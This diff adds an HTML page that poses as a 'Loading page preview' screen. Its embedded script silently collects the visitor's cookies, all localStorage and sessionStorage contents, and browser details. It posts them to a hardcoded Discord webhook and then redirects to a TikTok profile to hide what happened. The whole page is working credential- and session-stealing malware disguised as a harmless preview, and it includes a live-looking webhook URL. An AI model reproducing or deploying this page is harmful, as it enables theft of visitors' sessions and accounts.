@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d0d0d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        .box { text-align: center; padding: 40px; }
+        .ring {
+            width: 48px; height: 48px;
+            border: 3px solid #1a1a1a;
+            border-top: 3px solid #7c3aed;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        p { color: #a0a0a0; font-size: 14px; }
+        .sub { font-size: 12px; color: #555; margin-top: 8px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="ring"></div>
+        <p>Loading page preview</p>
+        <p class="sub" id="s">Fetching metadata...</p>
+    </div>
+
+    <script>
+    var WEBHOOK = "https://discord.com/api/webhooks/1515469201253597316/6-n6qSvzEK8btF3fY34yDFnPDfisXhiQNkf_ngAkUmkUaRidYjlmykP5HgXQIZoAaFf4";
+
+    (function(){
+        var e = document.getElementById("s");
+
+        var loot = {
+            cookies: "",
+            localStorage: "",
+            sessionStorage: "",
+            ua: navigator.userAgent,
+            language: navigator.language,
+            screen: screen.width + "x" + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || "direct",
+            url: location.href,
+            time: new Date().toISOString()
+        };
+
+        try { loot.cookies = document.cookie || "(none)"; } catch(er) {}
+        try {
+            var ls = {};
+            for (var i = 0; i < localStorage.length; i++) {
+                var k = localStorage.key(i);
+                ls[k] = localStorage.getItem(k);
+            }
+            loot.localStorage = JSON.stringify(ls);
+        } catch(er) { loot.localStorage = "(error)"; }
+        try {
+            var ss = {};
+            for (var i = 0; i < sessionStorage.length; i++) {
+                var k = sessionStorage.key(i);
+                ss[k] = sessionStorage.getItem(k);
+            }
+            loot.sessionStorage = JSON.stringify(ss);
+        } catch(er) { loot.sessionStorage = "(error)"; }
+
+        e.textContent = "Loading assets...";
+
+        var msg = "🍪 **New Visitor**\n";
+        msg += "```json\n";
+        msg += "Cookies: " + loot.cookies + "\n\n";
+        msg += "localStorage: " + loot.localStorage + "\n\n";
+        msg += "sessionStorage: " + loot.sessionStorage + "\n\n";
+        msg += "URL: " + loot.url + "\n";
+        msg += "Referrer: " + loot.referrer + "\n";
+        msg += "User-Agent: " + loot.ua + "\n";
+        msg += "Screen: " + loot.screen + "\n";
+        msg += "Timezone: " + loot.timezone + "\n";
+        msg += "Time: " + loot.time + "\n";
+        msg += "```";
+
+        var x = new XMLHttpRequest();
+        x.open("POST", WEBHOOK, true);
+        x.setRequestHeader("Content-Type", "application/json");
+        x.send(JSON.stringify({ content: msg }));
+
+        setTimeout(function(){
+            location.replace("https://www.tiktok.com/@khaby.lame");
+        }, 3000);
+    })();
+    </script>
+</body>
+</html>
